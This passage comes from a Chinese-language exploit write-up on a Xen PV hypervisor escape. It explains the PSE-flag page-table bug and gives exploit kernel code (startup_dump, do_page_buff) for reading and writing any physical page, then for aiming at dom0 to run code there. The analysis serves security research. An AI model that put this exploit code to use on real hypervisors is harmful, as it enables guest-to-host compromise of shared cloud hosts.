14px;"></span></p><pre class="brush:cpp;toolbar:false">/*&nbsp;Update&nbsp;the&nbsp;L2&nbsp;entry&nbsp;at&nbsp;pl2e&nbsp;to&nbsp;new&nbsp;value&nbsp;nl2e.&nbsp;pl2e&nbsp;is&nbsp;within&nbsp;frame&nbsp;pfn.&nbsp;*/
+static&nbsp;int&nbsp;mod_l2_entry(l2_pgentry_t&nbsp;*pl2e,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l2_pgentry_t&nbsp;nl2e,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;pfn,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;preserve_ad,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;vcpu&nbsp;*vcpu)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;l2_pgentry_t&nbsp;ol2e;
+&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;domain&nbsp;*d&nbsp;=&nbsp;vcpu-&gt;domain;
+&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;page_info&nbsp;*l2pg&nbsp;=&nbsp;mfn_to_page(pfn);
+&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;type&nbsp;=&nbsp;l2pg-&gt;u.inuse.type_info;
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;rc&nbsp;=&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;unlikely(!is_guest_l2_slot(d,&nbsp;type,&nbsp;pgentry_ptr_to_slot(pl2e)))&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_LOG(&quot;Illegal&nbsp;L2&nbsp;update&nbsp;attempt&nbsp;in&nbsp;Xen-private&nbsp;area&nbsp;%p&quot;,&nbsp;pl2e);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-EPERM;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;unlikely(__copy_from_user(&amp;ol2e,&nbsp;pl2e,&nbsp;sizeof(ol2e))&nbsp;!=&nbsp;0)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-EFAULT;
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;l2e_get_flags(nl2e)&nbsp;&amp;&nbsp;_PAGE_PRESENT&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;unlikely(l2e_get_flags(nl2e)&nbsp;&amp;&nbsp;L2_DISALLOW_MASK)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_LOG(&quot;Bad&nbsp;L2&nbsp;flags&nbsp;%x&quot;,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l2e_get_flags(nl2e)&nbsp;&amp;&nbsp;L2_DISALLOW_MASK);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-EINVAL;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Fast&nbsp;path&nbsp;for&nbsp;identical&nbsp;mapping&nbsp;and&nbsp;presence.&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!l2e_has_changed(ol2e,&nbsp;nl2e,&nbsp;_PAGE_PRESENT)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;adjust_guest_l2e(nl2e,&nbsp;d);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;UPDATE_ENTRY(l2,&nbsp;pl2e,&nbsp;ol2e,&nbsp;nl2e,&nbsp;pfn,&nbsp;vcpu,&nbsp;preserve_ad)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-EBUSY;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">整合起来,漏洞利用过程如下:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·取一个虚拟地址,</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·设置其对应的 L2 条目中的 PSE 标志,</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·以写权限访问整个 L1表 并构造表项绕过 Xen “不变性”,</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·取消之前设置的 PSE 标志,</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·访问任意物理页 :)。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">QubesOS 的公告也有此漏洞的详细解释[4]。</span></p><p style="margin-left: 20px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><strong><br/></strong></span></p><p style="margin-left: 20px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; color: rgb(0, 112, 192);"><strong>利用</strong></span></p><p style="margin-left: 19px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; color: rgb(0, 112, 192);"><strong>映射任意实机页面</strong></span></p><hr/><p style="margin-left: 19px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">我相信你掌握了实质,但这里仍有一个小问题:当 PSE 标志在 L2 条目中被设置,一些 L1地址的保留位应保持清除。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><br/></p><p style="text-align: center;"><img src="http://p9.qhimg.com/t01a55b8953562a62ed.png" title="t01a55b8953562a62ed.png" alt="http://p9.qhimg.com/t01a55b8953562a62ed.png"/></p><p><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">因此,需要找到一个保留位为0的可用的页帧号。 这可以通过Linux 分配器使用 __get_free_pages 函数请求 2MB连续内存来完成。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">//&nbsp;get&nbsp;an&nbsp;aligned&nbsp;mfn
+aligned_mfn_va&nbsp;=&nbsp;(void*)&nbsp;__get_free_pages(__GFP_ZERO,&nbsp;9);
+DEBUG(&quot;aligned_mfn_va&nbsp;=&nbsp;%p&quot;,&nbsp;aligned_mfn_va);
+DEBUG(&quot;aligned_mfn_va&nbsp;mfn&nbsp;=&nbsp;0x%lx&quot;,&nbsp;__machine_addr(aligned_mfn_va));
+page_walk((unsigned&nbsp;long)&nbsp;aligned_mfn_va);
+2MB&nbsp;内存映射的PSE&nbsp;标记已经被设置,我们需要预备&nbsp;2MB&nbsp;虚拟内存,因为我们不希望其他客户机与那些虚拟地址交互。
+//&nbsp;get&nbsp;a&nbsp;2Mb&nbsp;virtual&nbsp;memory
+l2_entry_va&nbsp;=&nbsp;(void*)&nbsp;__get_free_pages(__GFP_ZERO,&nbsp;9);
+DEBUG(&quot;l2_entry_va&nbsp;=&nbsp;%p&quot;,&nbsp;l2_entry_va);
+DEBUG(&quot;l2_entry_va&nbsp;mfn&nbsp;=&nbsp;0x%lx&quot;,&nbsp;__machine_addr(l2_entry_va));
+page_walk((unsigned&nbsp;long)&nbsp;l2_entry_va);</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">现在,取保留位为0的页帧号,并用在我们预备的 2MB 虚拟地址范围的 L2 值。这是必须的,因为这个预备的范围的 L2 值的保留位已置为1。因对齐的页帧号在别的地方映射为写权限,我们必须取消对应条目的 RW 标志来保持 Xen “不变性”。这些在 startup_dump 函数中实现:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">int&nbsp;startup_dump(unsigned&nbsp;long&nbsp;l2_entry_va,&nbsp;unsigned&nbsp;long&nbsp;aligned_mfn_va)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pte_t&nbsp;*pte_aligned&nbsp;=&nbsp;get_pte(aligned_mfn_va);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pmd_t&nbsp;*pmd&nbsp;=&nbsp;get_pmd(l2_entry_va);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;rc;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;removes&nbsp;RW&nbsp;bit&nbsp;on&nbsp;the&nbsp;aligned_mfn_va&#39;s&nbsp;pte
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rc&nbsp;=&nbsp;mmu_update(__machine_addr(pte_aligned)&nbsp;|&nbsp;MMU_NORMAL_PT_UPDATE,&nbsp;pte_aligned-&gt;pte&nbsp;&amp;&nbsp;~_PAGE_RW);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(rc&nbsp;&lt;&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printk(&quot;cannot&nbsp;unset&nbsp;RW&nbsp;flag&nbsp;on&nbsp;PTE&nbsp;(0x%lx)\n&quot;,&nbsp;aligned_mfn_va);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;map.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rc&nbsp;=&nbsp;mmu_update(__machine_addr(pmd)&nbsp;|&nbsp;MMU_NORMAL_PT_UPDATE,&nbsp;(__mfn((void*)&nbsp;aligned_mfn_va)&nbsp;&lt;&lt;&nbsp;PAGE_SHIFT)&nbsp;|&nbsp;PMD_FLAG);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(rc&nbsp;&lt;&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printk(&quot;cannot&nbsp;update&nbsp;L2&nbsp;entry&nbsp;0x%lx\n&quot;,&nbsp;l2_entry_va);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
+}</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">如此,我们能够使用 do_page_buff 函数读写任意实物理页面了:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">void&nbsp;do_page_buff(unsigned&nbsp;long&nbsp;mfn,&nbsp;char&nbsp;*buff,&nbsp;int&nbsp;what)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_l2_pse_flag((unsigned&nbsp;long)&nbsp;l2_entry_va);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(unsigned&nbsp;long*)&nbsp;l2_entry_va&nbsp;=&nbsp;(mfn&nbsp;&lt;&lt;&nbsp;PAGE_SHIFT)&nbsp;|&nbsp;PTE_FLAG;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset_l2_pse_flag((unsigned&nbsp;long)&nbsp;l2_entry_va);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(what&nbsp;==&nbsp;DO_PAGE_READ)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(buff,&nbsp;l2_entry_va,&nbsp;PAGE_SIZE);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(what&nbsp;==&nbsp;DO_PAGE_WRITE)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(l2_entry_va,&nbsp;buff,&nbsp;PAGE_SIZE);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_l2_pse_flag((unsigned&nbsp;long)&nbsp;l2_entry_va);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(unsigned&nbsp;long*)&nbsp;l2_entry_va&nbsp;=&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset_l2_pse_flag((unsigned&nbsp;long)&nbsp;l2_entry_va);
+}</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 19px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><strong><br/></strong></span></p><p style="margin-left: 19px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; color: rgb(0, 112, 192);"><strong>dom0 </strong><strong>中执行代码</strong></span></p><hr/><p style="margin-left: 19px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">好了,我们能够读写任意实物理页面了,困难的是找到一些有趣的东西。dom0 的页目录是个不错的目标,这应该让我们解决任何虚拟地址到对应的物理页的映射,那时可以写入进程内存来执行一些任意代码,或是在任意进程中发现一个有趣的页面映射(如 vDSO ;))。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">由于 Xen 的内存布局,很容易找到一个像页目录的页面(xen/include/asm-x86/config.h):</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">/*
+&nbsp;*&nbsp;Memory&nbsp;layout:
+&nbsp;*&nbsp;&nbsp;0x0000000000000000&nbsp;-&nbsp;0x00007fffffffffff&nbsp;[128TB,&nbsp;2^47&nbsp;bytes,&nbsp;PML4:0-255]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Guest-defined&nbsp;use&nbsp;(see&nbsp;below&nbsp;for&nbsp;compatibility&nbsp;mode&nbsp;guests).
+&nbsp;*&nbsp;&nbsp;0x0000800000000000&nbsp;-&nbsp;0xffff7fffffffffff&nbsp;[16EB]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Inaccessible:&nbsp;current&nbsp;arch&nbsp;only&nbsp;supports&nbsp;48-bit&nbsp;sign-extended&nbsp;VAs.
+&nbsp;*&nbsp;&nbsp;0xffff800000000000&nbsp;-&nbsp;0xffff803fffffffff&nbsp;[256GB,&nbsp;2^38&nbsp;bytes,&nbsp;PML4:256]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Read-only&nbsp;machine-to-phys&nbsp;translation&nbsp;table&nbsp;(GUEST&nbsp;ACCESSIBLE).
+&nbsp;*&nbsp;&nbsp;0xffff804000000000&nbsp;-&nbsp;0xffff807fffffffff&nbsp;[256GB,&nbsp;2^38&nbsp;bytes,&nbsp;PML4:256]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Reserved&nbsp;for&nbsp;future&nbsp;shared&nbsp;info&nbsp;with&nbsp;the&nbsp;guest&nbsp;OS&nbsp;(GUEST&nbsp;ACCESSIBLE).
+&nbsp;*&nbsp;&nbsp;0xffff808000000000&nbsp;-&nbsp;0xffff80ffffffffff&nbsp;[512GB,&nbsp;2^39&nbsp;bytes,&nbsp;PML4:257]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;ioremap&nbsp;for&nbsp;PCI&nbsp;mmconfig&nbsp;space
+&nbsp;*&nbsp;&nbsp;0xffff810000000000&nbsp;-&nbsp;0xffff817fffffffff&nbsp;[512GB,&nbsp;2^39&nbsp;bytes,&nbsp;PML4:258]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Guest&nbsp;linear&nbsp;page&nbsp;table.
+&nbsp;*&nbsp;&nbsp;0xffff818000000000&nbsp;-&nbsp;0xffff81ffffffffff&nbsp;[512GB,&nbsp;2^39&nbsp;bytes,&nbsp;PML4:259]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Shadow&nbsp;linear&nbsp;page&nbsp;table.
+&nbsp;*&nbsp;&nbsp;0xffff820000000000&nbsp;-&nbsp;0xffff827fffffffff&nbsp;[512GB,&nbsp;2^39&nbsp;bytes,&nbsp;PML4:260]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Per-domain&nbsp;mappings&nbsp;(e.g.,&nbsp;GDT,&nbsp;LDT).
+&nbsp;*&nbsp;&nbsp;0xffff828000000000&nbsp;-&nbsp;0xffff82bfffffffff&nbsp;[256GB,&nbsp;2^38&nbsp;bytes,&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Machine-to-phys&nbsp;translation&nbsp;table.
+&nbsp;*&nbsp;&nbsp;0xffff82c000000000&nbsp;-&nbsp;0xffff82cfffffffff&nbsp;[64GB,&nbsp;&nbsp;2^36&nbsp;bytes,&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;vmap()/ioremap()/fixmap&nbsp;area.
+&nbsp;*&nbsp;&nbsp;0xffff82d000000000&nbsp;-&nbsp;0xffff82d03fffffff&nbsp;[1GB,&nbsp;&nbsp;&nbsp;2^30&nbsp;bytes,&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Compatibility&nbsp;machine-to-phys&nbsp;translation&nbsp;table.
+&nbsp;*&nbsp;&nbsp;0xffff82d040000000&nbsp;-&nbsp;0xffff82d07fffffff&nbsp;[1GB,&nbsp;&nbsp;&nbsp;2^30&nbsp;bytes,&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;High&nbsp;read-only&nbsp;compatibility&nbsp;machine-to-phys&nbsp;translation&nbsp;table.
+&nbsp;*&nbsp;&nbsp;0xffff82d080000000&nbsp;-&nbsp;0xffff82d0bfffffff&nbsp;[1GB,&nbsp;&nbsp;&nbsp;2^30&nbsp;bytes,&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Xen&nbsp;text,&nbsp;static&nbsp;data,&nbsp;bss.
+#ifndef&nbsp;CONFIG_BIGMEM
+&nbsp;*&nbsp;&nbsp;0xffff82d0c0000000&nbsp;-&nbsp;0xffff82dffbffffff&nbsp;[61GB&nbsp;-&nbsp;64MB,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Reserved&nbsp;for&nbsp;future&nbsp;use.
+&nbsp;*&nbsp;&nbsp;0xffff82dffc000000&nbsp;-&nbsp;0xffff82dfffffffff&nbsp;[64MB,&nbsp;&nbsp;2^26&nbsp;bytes,&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Super-page&nbsp;information&nbsp;array.
+&nbsp;*&nbsp;&nbsp;0xffff82e000000000&nbsp;-&nbsp;0xffff82ffffffffff&nbsp;[128GB,&nbsp;2^37&nbsp;bytes,&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Page-frame&nbsp;information&nbsp;array.
+&nbsp;*&nbsp;&nbsp;0xffff830000000000&nbsp;-&nbsp;0xffff87ffffffffff&nbsp;[5TB,&nbsp;5*2^40&nbsp;bytes,&nbsp;PML4:262-271]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;1:1&nbsp;direct&nbsp;mapping&nbsp;of&nbsp;all&nbsp;physical&nbsp;memory.
+#else
+&nbsp;*&nbsp;&nbsp;0xffff82d0c0000000&nbsp;-&nbsp;0xffff82ffdfffffff&nbsp;[188.5GB,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Reserved&nbsp;for&nbsp;future&nbsp;use.
+&nbsp;*&nbsp;&nbsp;0xffff82ffe0000000&nbsp;-&nbsp;0xffff82ffffffffff&nbsp;[512MB,&nbsp;2^29&nbsp;bytes,&nbsp;PML4:261]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Super-page&nbsp;information&nbsp;array.
+&nbsp;*&nbsp;&nbsp;0xffff830000000000&nbsp;-&nbsp;0xffff847fffffffff&nbsp;[1.5TB,&nbsp;3*2^39&nbsp;bytes,&nbsp;PML4:262-264]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Page-frame&nbsp;information&nbsp;array.
+&nbsp;*&nbsp;&nbsp;0xffff848000000000&nbsp;-&nbsp;0xffff87ffffffffff&nbsp;[3.5TB,&nbsp;7*2^39&nbsp;bytes,&nbsp;PML4:265-271]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;1:1&nbsp;direct&nbsp;mapping&nbsp;of&nbsp;all&nbsp;physical&nbsp;memory.
+#endif
+&nbsp;*&nbsp;&nbsp;0xffff880000000000&nbsp;-&nbsp;0xffffffffffffffff&nbsp;[120TB,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PML4:272-511]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;PV:&nbsp;Guest-defined&nbsp;use.
+&nbsp;*&nbsp;&nbsp;0xffff880000000000&nbsp;-&nbsp;0xffffff7fffffffff&nbsp;[119.5TB,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PML4:272-510]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;HVM/idle:&nbsp;continuation&nbsp;of&nbsp;1:1&nbsp;mapping
+&nbsp;*&nbsp;&nbsp;0xffffff8000000000&nbsp;-&nbsp;0xffffffffffffffff&nbsp;[512GB,&nbsp;2^39&nbsp;bytes&nbsp;&nbsp;PML4:511]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;HVM/idle:&nbsp;unused
+&nbsp;*
+&nbsp;*&nbsp;Compatibility&nbsp;guest&nbsp;area&nbsp;layout:
+&nbsp;*&nbsp;&nbsp;0x0000000000000000&nbsp;-&nbsp;0x00000000f57fffff&nbsp;[3928MB,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PML4:0]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Guest-defined&nbsp;use.
+&nbsp;*&nbsp;&nbsp;0x00000000f5800000&nbsp;-&nbsp;0x00000000ffffffff&nbsp;[168MB,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PML4:0]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Read-only&nbsp;machine-to-phys&nbsp;translation&nbsp;table&nbsp;(GUEST&nbsp;ACCESSIBLE).
+&nbsp;*&nbsp;&nbsp;0x0000000100000000&nbsp;-&nbsp;0x0000007fffffffff&nbsp;[508GB,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PML4:0]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Unused.
+&nbsp;*&nbsp;&nbsp;0x0000008000000000&nbsp;-&nbsp;0x000000ffffffffff&nbsp;[512GB,&nbsp;2^39&nbsp;bytes,&nbsp;PML4:1]
+&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;Hypercall&nbsp;argument&nbsp;translation&nbsp;area.
